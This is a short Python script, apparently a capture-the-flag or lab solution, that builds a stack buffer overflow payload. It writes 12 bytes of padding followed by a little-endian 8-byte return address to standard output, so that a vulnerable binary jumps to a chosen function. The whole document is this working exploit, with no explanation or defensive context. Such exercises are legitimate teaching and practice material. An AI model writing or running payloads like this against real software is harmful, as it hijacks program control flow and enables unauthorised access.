import sys

offset = 12
target_address = 0x00005555555551eb

payload = b'A' * offset + target_address.to_bytes(8, byteorder='little')

sys.stdout.buffer.write(payload)